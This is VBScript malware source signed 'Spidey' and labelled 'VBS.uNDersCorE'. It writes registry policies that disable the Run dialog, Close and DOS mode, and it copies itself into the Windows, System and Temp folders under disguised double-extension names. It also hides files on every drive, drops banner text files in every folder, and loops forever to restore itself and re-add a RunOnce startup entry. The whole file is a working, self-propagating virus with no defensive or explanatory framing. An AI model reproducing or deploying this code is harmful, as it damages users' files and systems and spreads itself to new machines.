'by Spidey
Randomize : On Error Resume Next
Set f_S_o_b_J_ = CreateObject("Scripting.FileSystemObject")
Set W_s_H_e_L_L_ = Wscript.CreateObject("Wscript.Shell")
Err = W_s_H_e_L_L_.RegRead("HKCU\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (Err <> 1) then
W_s_H_e_L_L_.RegWrite "HKCU\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
'
W_s_H_e_L_L_.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD"
W_s_H_e_L_L_.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD"
W_s_H_e_L_L_.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",1,"REG_DWORD"
W_s_H_e_L_L_.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode",1,"REG_DWORD"
'
C_r_t()
'
Set W_i_n_ = f_S_o_b_J_.GetSpecialFolder(0)
Set S_y_s_t_ = f_S_o_b_J_.GetSpecialFolder(1)
Set t_e_m_P_ = f_S_o_b_J_.GetSpecialFolder(2)
Set c_R_e_a_t_e_ = f_S_o_b_J_.GetFile(WScript.ScriptFullName)
wiN = W_i_n_ & "\_u_N_D_e_r_s_C_o_r_E_.vbs"
sYs = S_y_s_t_ & "\u_N_D_e_r_w_e_a_R_e_.jpeg.vbs"
teMP = t_e_m_P_ & "\u_N_D_e_r_c_O_N_s_t_r_u_c_t_i_o_n_.txt.vbs"
w_i_F_e = W_i_n_ & "\"&chr(65)&chr(115)&chr(116)&chr(114)&chr(105)&chr(100) & ".jpg.vbs"
c_R_e_a_t_e_.Copy(wiN)
c_R_e_a_t_e_.Copy(sYs)
c_R_e_a_t_e_.Copy(teMP)
c_R_e_a_t_e_.Copy(w_i_F_e)
'
Sub C_r_t()
S_t_r_i_N_G_ =("                   _                       __"&vbcrlf&" _______________  /_/      _ _________    / /"&vbcrlf&"/ ______/  ____ \_ _______/ / _____ \ \  / /"&vbcrlf&"\______ \  _____/ / _____  / _______/\ \/ /"&vbcrlf&"/ ______/__/__ /_/\_______/\_______/__\  /"&vbcrlf&"\/ \____________________________________/"&vbcrlf&"       M A T R I X ~ M i s s o n"&vbcrlf&" "&vbcrlf&"http://Spidey.uni.cc/"&vbcrlf&"G2iP(at)SoftHome(dot)net")
On Error Resume Next
Set f_S_o_b_J_=CreateObject("Scripting.FileSystemObject")
Set D_r_v_=f_S_o_b_J_.Drives
For Each Drive in D_r_v_
if Drive.isReady then
f_i_n_D Drive & "\"
End if
Next
End Sub
Sub f_i_n_D(m_y_o_w_n_)
On Error Resume Next
Set c_R_i_= f_S_o_b_J_.GetFolder(m_y_o_w_n_)
For Each f_i_L_e_ in c_R_i_.Files
if (C_h_e_C_k_<> m_y_o_w_n_) then
On Error Resume Next
Set a_t_t_ = f_S_o_b_J_.GetFile(m_y_o_w_n_ & f_i_L_e_.Path)
a_t_t_.Attributes = a_t_t_.Attributes+2
Set w_R_t_e_n_ = f_S_o_b_J_.CreateTextFile(m_y_o_w_n_ & "\Show Me.txt")
w_R_t_e_n_.Writeline S_t_r_i_N_G_
w_R_t_e_n_.Close
C_h_e_C_k_ = m_y_o_w_n_
End if
Next
For Each f_o_L_d_R_ in c_R_i_.SubFolders
f_i_n_D(f_o_L_d_R_.path)
Next
End sub
'
Set o_P_e_n_ = f_S_o_b_J_.OpenTextFile(WScript.ScriptFullName)
c_O_d_e = o_P_e_n_.ReadAll
Do
if not(f_S_o_b_J_.fileexists(wscript.scriptfullname)) then
set O_h_Y_e_s_ = f_S_o_b_J_.createtextfile(wscript.scriptfullname)
O_h_Y_e_s_.write c_O_d_e
O_h_Y_e_s_.close
end if
a_N_T_i = W_s_H_e_L_L_.RegRead("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\RunOnce\cLeaNinG")
if a_N_T_i <> "WScript.exe" & w_i_F_e & "%" then
W_s_H_e_L_L_.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\RunOnce\cLeaNinG","WScript.exe " & w_i_F_e & " %"
End if
C_r_t()
Loop
'
'VBS.uNDersCorE
'www.Spidey.uni.cc | G2iP(at)SoftHome(dot)